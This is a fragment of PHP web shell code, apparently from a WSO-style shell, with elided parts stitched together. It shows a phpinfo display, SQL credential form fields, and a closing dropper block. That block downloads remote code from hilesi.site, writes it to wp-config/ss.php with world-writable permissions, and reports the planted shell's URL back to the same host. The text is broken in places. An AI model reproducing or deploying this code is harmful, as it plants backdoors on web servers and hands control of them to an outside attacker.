...
function actionPhp() {
	...
	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
		...
		$tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU','',$tmp);echo $tmp;
		echo '</div><br>';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
...
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
	...
	echo "</td>
                ...
                <td><inputtype=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':'checked'). "> count the number of rows</td>
			</tr>
		</table>
		<script>
...
<?php 
error_reporting(0);
mkdir('wp-config', 0777, true);
$uzak = file_get_contents('https://hilesi.site/kehanet/jellyfish/acababuneamk.txt');
$dosya = 'wp-config/ss.php';
if (file_put_contents($dosya, $uzak) !== false) {
    ...
    $url = "http://".$dir."wp-config/ss.php";
    file_get_contents("https://hilesi.site/kehanet/jellyfish/jelly.php?fish=".$url);
}
?>
